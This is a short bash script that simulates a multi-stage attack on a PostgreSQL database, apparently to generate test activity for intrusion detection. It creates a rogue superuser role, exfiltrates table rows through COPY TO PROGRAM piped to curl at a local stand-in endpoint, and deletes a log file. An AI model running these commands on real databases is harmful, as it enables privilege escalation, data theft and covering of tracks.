#!/bin/bash
echo "Simulating Multi-Stage APT Attack (Single Unified Session)..."

# Everything between <<EOF and EOF runs continuously inside the EXACT SAME Postgres Session (same Session ID).
psql -U postgres -d casce_tpcb <<EOF > /dev/null 2>&1
-- Stage 1: Database Enumeration (Benign Noise)
SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';
SELECT 1 FROM pg_sleep(1); -- Emulate human read delay

-- Stage 2: Database Privilege Escalation (Malicious DB Layer)
CREATE ROLE apt_hacker SUPERUSER LOGIN PASSWORD 'apt_pass';
SELECT 1 FROM pg_sleep(1);

-- Stage 3: Cross-layer payload delivery (Malicious OS Layer)
COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';
EOF

# Stage 4: OS-only Sabotage (Cat 1) happens immediately after DB disconnect
sh -c "rm -f /tmp/some_fake_log.log 2>/dev/null || true"

echo "Multi-stage APT simulated successfully inside a unified session."
